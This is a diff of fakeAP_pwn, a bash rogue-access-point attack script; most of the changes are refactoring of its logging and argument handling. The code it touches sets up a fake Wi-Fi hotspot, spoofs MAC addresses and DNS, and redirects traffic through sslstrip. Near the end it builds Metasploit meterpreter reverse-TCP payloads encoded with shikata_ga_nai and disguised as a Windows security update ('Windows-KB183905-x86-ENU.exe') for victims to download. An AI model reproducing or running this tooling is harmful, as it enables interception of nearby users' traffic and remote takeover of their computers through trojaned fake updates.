@@ -9,7 +9,7 @@
 #                                                                                              #
 #  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
 #  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
-#  See the  GNU General Public License for more details.                                       #
+#  See the GNU General Public License for more details.                                        #
 #                                                                                              #
 #  You should have received a copy of the GNU General Public License along with this program.  #
 #  If not, see <http://www.gnu.org/licenses/>.                                                 #
@@ -73,10 +73,10 @@ verbose="0"
 trap 'cleanup interrupt' 2           # Captures interrupt signal (Ctrl + C)
 
 #----Functions---------------------------------------------------------------------------------#
-function action() { #action title command screen&file #x|y|lines #hold
+function action() { #action title command #screen&file #x|y|lines #hold
    error="free"
    if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
-   if [ "$3" != "true" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
+   if [ ! -z "$3" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
    if [ ! -z "$5" ] && [ "$5" != "true" ] ; then error="5" ; fi # Coding error
    
    if [ "$error" == "free" ] ; then
@@ -85,10 +85,10 @@ function action() { #action title command screen&file #x|y|lines #hold
       x="100"
       y="0"
       lines="15"
-      if [ "$5" == "hold" ] ; then xterm="$xterm -hold" ; fi
+      if [ "$5" ] ; then xterm="$xterm -hold" ; fi
       if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
       if [ "$diagnostics" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
-      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ] ; then command="$command | tee -a $logFile" ; fi
+      if [ "$diagnostics" == "true" ] && [ "$3" ] ; then command="$command | tee -a $logFile" ; fi
       if [ ! -z "$4" ] ; then
          x=$(echo $4 | cut -d'|' -f1)
          y=$(echo $4 | cut -d'|' -f2)
@@ -97,17 +97,17 @@ function action() { #action title command screen&file #x|y|lines #hold
       $xterm -geometry 84x$lines+$x+$y -T "fakeAP_pwn v$version - $1" -e "$command"
       return 0
    else
-      display error "action. Error code: $error"
-      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: action (Error code: $error): $1 , $2 , $3 , $4 , $5" >> $logFile ;
+      display error "action. Error code: $error" 1>&2
+      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile ;
       return 1
    fi
 }
-function cleanup() { #cleanup mode
+function cleanup() { #cleanup #mode
    if [ "$1" == "nonuser" ] ; then exit 3 ;
    elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
       echo # Blank line
-      action "Killing xterm" "killall xterm" "true"
       if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*** BREAK ***" ; fi # User quit
+      action "Killing xterm" "killall xterm"
    fi
    
    if [ "$1" != "remove" ]; then
@@ -117,10 +117,10 @@ function cleanup() { #cleanup mode
             command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
             if [ "$command" == "$monitorInterface" ] ; then
                sleep 1 # Sometimes it needs to catch up/wait
-               action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" "true"
+               action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
             fi
          else
-            action "Monitor Mode (Stopping)" "airmon-ng stop $apInterface" "true"
+            action "Monitor Mode (Stopping)" "airmon-ng stop $apInterface"
          fi
       fi
       
@@ -135,7 +135,7 @@ function cleanup() { #cleanup mode
 
    if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3.bkup" ]; then mv -f "/etc/dhcp3/dhcpd.conf.bkup" "/etc/dhcp3/dhcpd.conf" ; fi # ubuntu fixes - folder persmissions
 
-   if [ "$debug" != "true" ] ; then
+   if [ "$debug" != "true" ] || [ "$1" == "remove" ] ; then
       command=""
       if [ "$1" != "clean" ] && [ -e "/tmp/fakeAP_pwn.wkv" ] ; then command="$command /tmp/fakeAP_pwn.wkv" ; fi
       if [ -e "/tmp/fakeAP_pwn.rb" ] ; then command="$command /tmp/fakeAP_pwn.rb" ; fi
@@ -153,13 +153,13 @@ function cleanup() { #cleanup mode
       if [ -e "$www/SecurityUpdate1-83-90-5.dmg.bin" ] ; then command="$command $www/SecurityUpdate1-83-90-5.dmg.bin" ; fi
       if [ -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then command="$command $www/Windows-KB183905-x86-ENU.exe" ; fi
       if [ -e "$logFile" ] ; then command="$command $logFile" ; fi
-      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" "true" ; fi
+      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" ; fi
       
       if [ -e "/etc/apache2/sites-available/fakeAP_pwn" ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
-         action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop" "true"
-         action "Restoring apache" "rm /etc/apache2/sites-available/fakeAP_pwn" "true"
+         action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop"
+         action "Restoring apache" "rm /etc/apache2/sites-available/fakeAP_pwn"
       fi
-      if [ -d "$www/images" ] ; then action "Removing temp files" "rm -rf $www/images" "true" ; fi
+      if [ -d "$www/images" ] ; then action "Removing temp files" "rm -rf $www/images" ; fi
    fi
    
    if [ "$1" != "remove" ]; then
@@ -167,7 +167,7 @@ function cleanup() { #cleanup mode
       exit 0
    fi
 }
-function display(){ #display type message
+function display() { #display type message
    error="free"
    if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
    if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="2"; fi # Coding error
@@ -180,18 +180,18 @@ function display(){ #display type message
       if [ "$1" == "error" ]  ; then output="\e[01;31m[-]\e[00m" ; fi
       output="$output $2"
       echo -e "$output"
-      if [ "$3" == "true" ] ; then
+      
+      if [ "$diagnostics" == "true" ] ; then
          if [ "$1" == "action" ] ; then output="[>]" ; fi
          if [ "$1" == "info" ] ;   then output="[i]" ; fi
          if [ "$1" == "diag" ] ;   then output="[+]" ; fi
          if [ "$1" == "error" ] ;  then output="[-]" ; fi
          echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
-
       fi
       return 0
    else
       display error "display. Error code: $error" $logFile
-      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: display (Error code: $error): $1 , $2" >> $logFile ;
+      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: display (Error code: $error): $1, $2" >> $logFile ;
       return 1
    fi
 }
@@ -264,7 +264,7 @@ function help() { #help
 }
 function ipTables() { #ipTables mode #$apInterface #$interface #$gateway
    error="free"
-   if [ -z "$1" ] ;                              then error="1" ; fi # Coding error
+   if [ -z "$1" ] ; then error="1" ; fi # Coding error
    if [ "$1" != "clear" ] && [ "$1" != "force" ] && [ "$1" != "transparent" ] && [ "$1" != "squid" ] && [ "$1" != "sslstrip" ] ; then error="2" ; fi # Coding error
    if [ "$1" == "force" ] && [ -z "$2" ] ;       then error="3" ; fi # Coding error
    if [ "$1" == "transparent" ] && [ -z "$2" ] ; then error="4" ; fi # Coding error
@@ -313,7 +313,7 @@ function ipTables() { #ipTables mode #$apInterface #$interface #$gateway
          ipTables transparent $apInterface $interface $gateway
          command="iptables --table nat --append PREROUTING -p tcp --destination-port 80 --jump REDIRECT --to-port 10000"
       fi
-      action "iptables" "$command" "true"
+      action "iptables" "$command"
       if [ "$diagnostics" == "true" ] ; then
          echo "-iptables------------------------------------" >> $logFile
          iptables -L >> $logFile
@@ -323,7 +323,7 @@ function ipTables() { #ipTables mode #$apInterface #$interface #$gateway
       return 0
    else
       display error "iptables. Error code: $error"
-      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: iptables (Error code: $error): $1, $2, $3, $4, $4" >> $logFile ;
+      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: iptables (Error code: $error): $1, $2, $3, $4" >> $logFile ;
       return 1
    fi
 }
@@ -341,7 +341,7 @@ function testAP() { # testAP $essid $wifiInterface
 function update() { #update
    if [ -e "/usr/bin/svn" ] ; then
       display action "Checking for an update..."
-      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" |cut -c11-) # Last Changed Rev?
+      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" | cut -c11-) # Last Changed Rev?
       if [ "$version" != "0.3 (#$update)" ] ; then
          display info "Updating..."
          svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
@@ -501,8 +501,8 @@ if [ "$diagnostics" == "true" ] ; then
    route -n >> $logFile
    if [ "$mode" != "non" ] ; then
       echo "-Ping------------------------------------" >> $logFile
-      action "Ping" "ping -I $interface -c 4 $ourIP" "true"
-      action "Ping" "ping -I $interface -c 4 $gateway" "true"
+      action "Ping" "ping -I $interface -c 4 $ourIP"
+      action "Ping" "ping -I $interface -c 4 $gateway"
    fi
 fi
 if [ "$mode" != "non" ] ; then 
@@ -547,7 +547,7 @@ if [ "$apType" == "airbase-ng" ] ; then
    if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
       display error "aircrack-ng isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" "true" ; fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" ; fi
       if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
          display error "Failed to install aircrack-ng" 1>&2
          cleanup
@@ -560,17 +560,17 @@ elif [ "$apType" == "hostapd" ] ; then
       display error "hostapd isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
       if [ "$REPLY" =~ ^[Yy]$ ] ; then
-         action "Install hostapd" "wget -P /tmp http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz && tar -C /tmp -xvf /tmp/libnl-1.1.tar.gz && rm /tmp/libnl-1.1.tar.gz && command=$(pwd) && cd /tmp/libnl-1.1 && ./configure && cd $command" "true"
+         action "Install hostapd" "wget -P /tmp http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz && tar -C /tmp -xvf /tmp/libnl-1.1.tar.gz && rm /tmp/libnl-1.1.tar.gz && command=$(pwd) && cd /tmp/libnl-1.1 && ./configure && cd $command"
          find="#include <ctype.h>"
          replace="#include <ctype.h>\n#include <limits.h> "
          sed "s/$find/$replace/g" "/tmp/libnl-1.1/include/netlink-local.h" > "/tmp/libnl-1.1/include/netlink-local.h.new"
          mv -f "/tmp/libnl-1.1/include/netlink-local.h.new" "/tmp/libnl-1.1/include/netlink-local.h"
-         action "Install hostapd" "make -C /tmp/libnl-1.1 && make install -C /tmp/libnl-1.1" "true"
-         action "Install hostapd" "wget -P /tmp http://hostap.epitest.fi/releases/hostapd-0.7.2.tar.gz && tar -C /tmp -xvf /tmp/hostapd-0.7.2.tar.gz && rm /tmp/hostapd-0.7.2.tar.gz" "true"
+         action "Install hostapd" "make -C /tmp/libnl-1.1 && make install -C /tmp/libnl-1.1"
+         action "Install hostapd" "wget -P /tmp http://hostap.epitest.fi/releases/hostapd-0.7.2.tar.gz && tar -C /tmp -xvf /tmp/hostapd-0.7.2.tar.gz && rm /tmp/hostapd-0.7.2.tar.gz"
          find="#CONFIG_DRIVER_NL80211=y"
          replace="CONFIG_DRIVER_NL80211=y"
          sed "s/$find/$replace/g" /tmp/hostapd-0.7.2/hostapd/defconfig > /tmp/hostapd-0.7.2/hostapd/.config
-         action "Install hostapd" "make -C /tmp/hostapd-0.7.2/hostapd/ && make install -C /tmp/hostapd-0.7.2/hostapd/" "true"
+         action "Install hostapd" "make -C /tmp/hostapd-0.7.2/hostapd/ && make install -C /tmp/hostapd-0.7.2/hostapd/"
          if [ ! -e "/usr/sbin/hostapd" ] && [ ! -e "/usr/local/bin/hostapd" ] ; then
             display error "Failed to install hostapd." 1>&2
             cleanup
@@ -583,7 +583,7 @@ fi
 if [ ! -e "/usr/bin/macchanger" ] && [ "$macMode" != "false" ] ; then
    display error "macchanger isn't installed."
    read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" "true" ; fi
+   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" ; fi
    if [ ! -e "/usr/bin/macchanger" ] ; then
       display error "Failed to install macchanger" 1>&2 ; cleanup
    else
@@ -593,7 +593,7 @@ fi
 if [ ! -e "/usr/sbin/dhcpd3" ] ; then
    display error "dhcpd3 isn't installed."
    read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dhcpd3" "apt-get -y install dhcp3-server" "true" ; fi
+   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dhcpd3" "apt-get -y install dhcp3-server" ; fi
    if [ ! -e "/usr/sbin/dhcpd3" ] ; then
       display error "Failed to install dhcpd3" 1>&2 ; cleanup
    else
@@ -603,7 +603,7 @@ fi
 if [ ! -e "/usr/sbin/dnsspoof" ] && [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    display error "dnsspoof isn't installed."
    read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dnsspoof" "apt-get -y install dsniff" "true" ; fi
+   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dnsspoof" "apt-get -y install dsniff" ; fi
    if [ ! -e "/usr/sbin/dnsspoof" ] ; then
       display error "Failed to install dnsspoof" 1>&2 ; cleanup
    else
@@ -613,7 +613,7 @@ fi
 if [ ! -e "/usr/sbin/apache2" ] && [ ! -e "/usr/lib/php5" ] && [ "$mode" != "normal" ] ; then
    display error "apache2 isn't installed."
    read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install apache2 php5" "apt-get -y install apache2 php5" "true" ; fi
+   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install apache2 php5" "apt-get -y install apache2 php5" ; fi
    if [ ! -e "/usr/sbin/apache2" ] ; then
       display error "Failed to install apache2" 1>&2 ; cleanup
    else
@@ -624,8 +624,8 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then
       display error "Metasploit isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install metasploit" "apt-get -y install framework3" "true" ; fi
-      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then action "Install metasploit" "apt-get -y install metasploit" "true" ; fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install metasploit" "apt-get -y install framework3" ; fi
+      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then action "Install metasploit" "apt-get -y install metasploit" ; fi
       if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then
          display error "Failed to install metasploit" 1>&2 ; cleanup
       else
@@ -635,7 +635,7 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    if [ "$payload" == "sbd" ] && [ ! -e "/usr/local/bin/sbd" ] ; then
       display error "sbd isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install sbd" "apt-get -y install sbd" "true" ;  fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install sbd" "apt-get -y install sbd" ;  fi
       if [ ! -e "/usr/local/bin/sbd" ] ; then
          display error "Failed to install sbd" 1>&2 ; cleanup
       else
@@ -644,7 +644,7 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    elif [ "$payload" == "vnc" ] && [ ! -e "/usr/bin/vncviewer" ] ; then
       display error "vnc isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install vnc" "apt-get -y install vnc" "true" ; fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install vnc" "apt-get -y install vnc" ; fi
       if [ ! -e "/usr/bin/vncviewer" ] ; then
          display error "Failed to install vnc" 1>&2 ; cleanup
       else
@@ -661,7 +661,7 @@ if [ "$mode" == "flip" ] ; then
    if [ ! -e "/usr/sbin/squid" ] ; then
       display error "squid isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install squid" "apt-get -y install squid" "true" ;  fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install squid" "apt-get -y install squid" ;  fi
       if [ ! -e "/usr/sbin/squid" ] ; then
          display error "Failed to install squid" 1>&2 ; cleanup
       else
@@ -671,7 +671,7 @@ if [ "$mode" == "flip" ] ; then
    if [ ! -e "/usr/bin/mogrify" ] ; then
       display error "mogrify isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install mogrify" "apt-get -y install imagemagick" "true" ;  fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install mogrify" "apt-get -y install imagemagick" ;  fi
       if [ ! -e "/usr/sbin/squid" ] ; then
          display error "Failed to install mogrify" 1>&2 ; cleanup
       else
@@ -683,7 +683,7 @@ if [ "$extras" == "true" ] ; then
    if [ ! -e "/usr/bin/imsniff" ] ; then
       display error "imsniff isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install imsniff" "apt-get -y install imsniff" "true" ; fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install imsniff" "apt-get -y install imsniff" ; fi
       if [ ! -e "/usr/bin/imsniff" ] ; then
          display error "Failed to install imsniff" 1>&2 ; cleanup
       else
@@ -693,7 +693,7 @@ if [ "$extras" == "true" ] ; then
    if [ ! -e "/usr/bin/driftnet" ] ; then
       display error "driftnet isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install driftnet" "apt-get -y install driftnet" "true" ; fi
+      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install driftnet" "apt-get -y install driftnet" ; fi
       if [ ! -e "/usr/bin/driftnet" ] ; then
          display error "Failed to install driftnet" 1>&2 ; cleanup
       else
@@ -701,23 +701,23 @@ if [ "$extras" == "true" ] ; then
       fi
    fi
    if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] ; then
-      display error "sslstrip isn't installed." $diagnostics
+      display error "sslstrip isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
       if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "wget -P /tmp http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz && tar -C /tmp -xvf /tmp/sslstrip-0.7.tar.gz && rm /tmp/sslstrip-0.7.tar.gz && mkdir -p /pentest/spoofing/sslstrip/ && mv -f /tmp/sslstrip-0.7/* /pentest/spoofing/sslstrip/ && rm -rf /tmp/sslstrip-0.7" $verbose $diagnostics "true" ; fi
       if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] ; then
-         display error "Failed to install sslstrip" $diagnostics 1>&2 ; cleanup
+         display error "Failed to install sslstrip" 1>&2 ; cleanup
       else
-         display info "Installed: sslstrip" $diagnostics
+         display info "Installed: sslstrip"
       fi
    fi
    if [ ! -e "/usr/sbin/ettercap" ] ; then
-      display error "ettercap isn't installed." $diagnostics
+      display error "ettercap isn't installed."
       read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
       if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install ettercap" "apt-get -y install ettercap ettercap-gtk ettercap-common" $verbose $diagnostics "true" ; fi
       if [ ! -e "/usr/sbin/ettercap" ] ; then
-         display error "Failed to install ettercap" $diagnostics 1>&2; cleanup
+         display error "Failed to install ettercap" 1>&2; cleanup
       else
-         display info "Installed: ettercap" $diagnostics
+         display info "Installed: ettercap"
       fi
    fi
 fi
@@ -726,7 +726,7 @@ if [ ! -e "$www/index.php" ] ; then
    if [ ! -d "$www/" ] ; then
       if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Copying www/" ; fi
       mkdir -p $www
-      action "mkdir $www && Copying www/" "cp -rf www/* $www/" "true"
+      action "mkdir $www && Copying www/" "cp -rf www/* $www/"
    fi
    if [ ! -e "$www/index.php" ] ; then
       display error "Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
@@ -739,24 +739,24 @@ display action "Configuring: Environment"
 
 #----------------------------------------------------------------------------------------------#
 if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Programs" ; fi
-action "Killing 'Programs'" "killall airbase-ng hostapd xterm" "true" # "wicd-client"
+action "Killing 'Programs'" "killall airbase-ng hostapd xterm" # "wicd-client"
 if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Daemons" ; fi
-action "Killing 'dhcp3 service'" "/etc/init.d/dhcp3-server stop" "true"
-if [ "$mode" == "flip" ] ; then action "Killing 'squid service'" "/etc/init.d/squid stop" "true" ; fi
-if [ "$mode" != "normal" ] ; then action "Killing 'apache2 service'" "/etc/init.d/apache2 stop" "true" ; fi
-#action "Killing 'wicd service'" "/etc/init.d/wicd stop" "true" # Stopping wicd to prevent channel hopping
+action "Killing 'dhcp3 service'" "/etc/init.d/dhcp3-server stop"
+if [ "$mode" == "flip" ] ; then action "Killing 'squid service'" "/etc/init.d/squid stop" ; fi
+if [ "$mode" != "normal" ] ; then action "Killing 'apache2 service'" "/etc/init.d/apache2 stop" ; fi
+#action "Killing 'wicd service'" "/etc/init.d/wicd stop" # Stopping wicd to prevent channel hopping
 
 #----------------------------------------------------------------------------------------------#
-action "Refreshing $wifiInterface" "ifconfig $wifiInterface down && ifconfig $wifiInterface up && sleep 1" "true"
+action "Refreshing $wifiInterface" "ifconfig $wifiInterface down && ifconfig $wifiInterface up && sleep 1"
 command=$(ifconfig | grep -o  "$wifiInterface")
 if [ -z $command ] ; then display error "$wifiInterface is down" 1>&2 ; cleanup; fi # check to make sure $interface came up!
 command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
 if [ -n "$command" ] ; then
-   action "Killing programs" "kill $command" "true" # to prevent interference
+   action "Killing programs" "kill $command" # to prevent interference
 fi
 
 if [ "$mode" != "non" ] ; then
-   action "Refreshing interface" "ifconfig $interface up && sleep 1" "true"
+   action "Refreshing interface" "ifconfig $interface up && sleep 1"
    if [ -z "$ourIP" ] ; then ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}') ; fi
 
    command=$(ifconfig | grep -o "$interface")
@@ -768,7 +768,7 @@ if [ "$mode" != "non" ] ; then
    fi
 
    if [ -z "$ourIP" ] && [ "$mode" != "non" ] ; then
-      action "Acquiring IP" "dhclient $interface && sleep 3" "true"
+      action "Acquiring IP" "dhclient $interface && sleep 3"
       command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
       if [ -z "$command" ] ; then
          display error "Haven't got an IP address on $interface." 1>&2
@@ -797,14 +797,14 @@ if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true"
 if [ "$apType" == "airbase-ng" ] ; then
    command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
    if [ "$command" == "$monitorInterface" ] ; then
-      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" "true"
+      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
       sleep 1
    fi
 
-   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface | tee /tmp/fakeAP_pwn.tmp" "true"
+   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface | tee /tmp/fakeAP_pwn.tmp"
    command=$(cat /tmp/fakeAP_pwn.tmp | awk '/monitor mode enabled on/ {print $5}' | tr -d '\011' | sed 's/\(.*\)./\1/')
    if [ "$monitorInterface" != "$command" ] ; then
-      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Configuring: Chaning monitorInterface to: $command" $diagnostics ; fi
+      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Configuring: Chaning monitorInterface to: $command" ; fi
       if [ $command ] ; then monitorInterface="$command" ; fi
    fi
 
@@ -826,7 +826,7 @@ if [ "$apType" == "airbase-ng" ] ; then
    if [ "$command" ] ; then # $interface is WiFi. Therefore two WiFi cards
       command=$(iwlist $interface scan 2>/dev/null | grep "essid:")
       if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
-      if [ ! -z "$command" ] ; then    # checking for a access point to test as we haven't created one yet
+      if [ ! -z "$command" ] ; then   # checking for a access point to test as we haven't created one yet
          if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
             display diag "Testing: Wireless Injection"
             command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
@@ -844,9 +844,9 @@ if [ "$apType" == "airbase-ng" ] ; then
    if [ "$macMode" == "random" ] || [ "$macMode" == "set" ] ; then
       if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" ; fi
       command="ifconfig $monitorInterface down &&"
-      if [ "$macMode" == "random" ] ; then  command="$command macchanger -A $monitorInterface &&"; fi
-      if [ "$macMode" == "set" ] ; then  command="$command macchanger -m $fakeMac $monitorInterface &&"; fi
-      action "Changing MAC Address of FakeAP" "$command ifconfig $monitorInterface up" "true"
+      if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface &&"; fi
+      if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface &&"; fi
+      action "Changing MAC Address of FakeAP" "$command ifconfig $monitorInterface up"
       sleep 2
    fi
    if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]; then
@@ -858,9 +858,9 @@ elif [ "$apType" == "hostapd" ] ; then
    if [ "$macMode" == "random" ] || [ "$macMode" == "set" ] ; then
       if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" ; fi
       command="ifconfig $wifiInterface down &&"
-      if [ "$macMode" == "random" ] ; then  command="$command macchanger -A $wifiInterface"; fi
-      if [ "$macMode" == "set" ] ; then  command="$command macchanger -m $fakeMac $wifiInterface"; fi
-      action "Changing MAC Address of FakeAP" "$command && ifconfig $wifiInterface up" "true"
+      if [ "$macMode" == "random" ] ; then command="$command macchanger -A $wifiInterface"; fi
+      if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $wifiInterface"; fi
+      action "Changing MAC Address of FakeAP" "$command && ifconfig $wifiInterface up"
       sleep 2
    fi
    if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
@@ -1419,8 +1419,8 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
    #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
-   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" "true"
-   #action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" "true"
